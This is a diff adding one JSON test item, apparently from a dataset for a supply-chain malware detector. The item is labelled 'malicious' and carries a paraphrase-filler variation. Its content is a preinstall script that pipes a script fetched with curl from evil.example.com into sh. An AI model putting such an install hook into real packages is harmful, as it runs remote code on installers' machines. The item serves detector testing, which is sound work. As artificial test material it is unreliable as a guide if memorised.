@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::98::paraphrase-variations::4",
+  "base_sample_id": "exp::supply-chain-detector::98",
+  "generator_id": "paraphrase-variations",
+  "generator_version": "1.0.0",
+  "seed": 400533622,
+  "content": "{\"scripts\": {\"preinstall\": \"curl -s https://evil.example.com/payload.sh basically, | sh\"}}\n",
+  "content_hash": "bc77f4c6cbb18d993e675cfc6a01c17a0f79bcf69ac5b5ef03043ceb22ca9540",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "paraphrase:filler",
+  "difficulty": "moderate"
+}
